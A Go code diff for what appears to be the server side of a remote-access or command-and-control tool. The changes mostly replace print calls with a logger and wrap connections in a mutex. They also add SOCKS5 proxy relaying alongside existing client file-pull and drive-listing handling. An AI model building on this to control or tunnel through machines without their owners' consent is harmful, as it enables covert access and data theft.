@@ -5,6 +5,7 @@ import (
 	"BackendTemplate/pkg/connection"
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
+	"BackendTemplate/pkg/logger"
 	"BackendTemplate/pkg/qqwry"
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
@@ -29,7 +30,13 @@ var upgrader = websocket.Upgrader{
 	},
 }
 
-var ClientManager = make(map[string]*websocket.Conn)
+var ClientManager = make(map[string]*WSClient)
+
+type WSClient struct {
+	Conn    *websocket.Conn
+	WriteMu sync.Mutex
+}
+
 var MuClientManager sync.Mutex
 
 type ClientTime struct {
@@ -42,14 +49,14 @@ var ClientTimeManager = make(map[string]*ClientTime)
 func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 	ws, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		log.Print("upgrade failed:", err)
+		logger.Error("upgrade failed:", err)
 		return
 	}
 
 	for {
 		_, message, err := ws.ReadMessage()
 		if err != nil {
-			fmt.Println(err)
+			logger.Error(err.Error())
 			break
 		}
 		if len(message) == 0 {
@@ -63,16 +70,20 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
 			MuClientManager.Lock()
-			ClientManager[uid] = ws
+
+			client1 := &WSClient{
+				Conn: ws,
+			}
+			ClientManager[uid] = client1
 			MuClientManager.Unlock()
 
 			connection.MuClientListenerType.Lock()
@@ -143,11 +154,11 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 
 			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
@@ -180,14 +191,14 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				// 使用通用的安全路径函数
 				fullPath, err := utils.GetSafeFilePath(uid, filePath)
 				if err != nil {
-					log.Printf("Security check failed: %v", err)
+					logger.Error("Security check failed: %v", err)
 					break
 				}
 
 				// 确保下载目录存在
 				downloadDir := filepath.Dir(fullPath) // 从安全路径获取目录
 				if err := os.MkdirAll(downloadDir, 0755); err != nil {
-					log.Printf("Failed to create download directory: %v", err)
+					logger.Error("Failed to create download directory: %v", err)
 					break
 				}
 
@@ -199,13 +210,13 @@ WHERE uid = ? AND file_path = ?;
 `
 				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
 				if err != nil {
-					log.Printf("Database update failed: %v", err)
+					logger.Error("Database update failed: %v", err)
 				}
 
 				// 检查文件是否存在，如果存在则删除
 				if _, err := os.Stat(fullPath); err == nil {
 					if err := os.Remove(fullPath); err != nil {
-						log.Printf("Failed to remove existing file: %v", err)
+						logger.Error("Failed to remove existing file: %v", err)
 						break
 					}
 				}
@@ -213,7 +224,7 @@ WHERE uid = ? AND file_path = ?;
 				// 创建新文件（使用安全路径）
 				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
 				if err != nil {
-					log.Printf("Failed to create file: %v", err)
+					logger.Error("Failed to create file: %v", err)
 					break
 				}
 				defer fp.Close()
@@ -225,7 +236,7 @@ WHERE uid = ? AND file_path = ?;
 				// 使用通用的安全路径函数
 				fullPath, err := utils.GetSafeFilePath(uid, filePath)
 				if err != nil {
-					log.Printf("Security check failed: %v", err)
+					logger.Error("Security check failed: %v", err)
 					break
 				}
 
@@ -237,20 +248,20 @@ WHERE uid = ? AND file_path = ?;
 				// 确保目录存在
 				downloadDir := filepath.Dir(fullPath)
 				if err := os.MkdirAll(downloadDir, 0755); err != nil {
-					log.Printf("Failed to create download directory: %v", err)
+					logger.Error("Failed to create download directory: %v", err)
 					break
 				}
 
 				// 使用安全路径打开文件
 				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 				if err != nil {
-					log.Printf("Failed to open file: %v", err)
+					logger.Error("Failed to open file: %v", err)
 					break
 				}
 				defer fp.Close()
 
 				if _, err := fp.Write(fileContent); err != nil {
-					log.Printf("Failed to write file content: %v", err)
+					logger.Error("Failed to write file content: %v", err)
 				}
 
 			case command.DRIVES:
@@ -261,16 +272,20 @@ WHERE uid = ? AND file_path = ?;
 				filePath := string(data[4 : 4+filePathLen])
 				fileContent := data[4+filePathLen:]
 				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
+			case command.Socks5Data:
+				md5sign := data[:16]
+				rawData := data[16:]
+				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
 			}
 		case 3: //heartBeat
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
@@ -285,7 +300,7 @@ WHERE uid = ? AND file_path = ?;
 		}
 
 		if err != nil {
-			log.Println("read error:", err)
+			logger.Error("read error:", err)
 			break
 		}
 
@@ -303,7 +318,7 @@ func checkHeartbeats(uid string) {
 			if currentTime.Sub(ClientTimeManager[uid].lastHeartbeat) > 10*time.Second {
 				ClientTimeManager[uid].timeoutCount++
 				if ClientTimeManager[uid].timeoutCount >= 30 {
-					ClientManager[uid].Close()
+					ClientManager[uid].Conn.Close()
 					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
 					delete(ClientManager, uid)
 					delete(ClientTimeManager, uid)
@@ -320,7 +335,7 @@ func checkHeartbeats(uid string) {
 func main() {
 	http.HandleFunc("/ws", HandleWebSocket)
 
-	log.Println("Starting server on :8080")
+	logger.Error("Starting server on :8080")
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		log.Fatal("ListenAndServe: ", err)
 	}
